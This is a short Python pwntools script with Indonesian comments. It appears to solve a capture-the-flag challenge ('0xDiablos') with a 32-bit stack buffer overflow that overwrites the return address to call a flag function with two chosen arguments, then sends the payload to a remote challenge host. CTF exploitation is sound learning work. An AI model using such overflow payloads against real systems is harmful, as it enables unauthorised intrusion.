from pwn import *

# Konfigurasi
ip = '83.136.251.105'
port = 30146

# Alamat & Argumen
addr_flag = 0x080491e2
addr_exit = 0x08049080 
arg1 = 0xdeadbeef
arg2 = 0xc0ded00d

# Bangun Payload
# [Padding 188] + [Alamat Flag] + [Dummy Return/Exit] + [Arg1] + [Arg2]
payload = b"A" * 188
payload += p32(addr_flag)
payload += p32(addr_exit)
payload += p32(arg1)
payload += p32(arg2)

# Eksekusi
io = remote(ip, port)
io.sendlineafter(b"0xDiablos:", payload)

# Terima semua data dan tampilkan
print(io.recvall().decode('latin-1'))
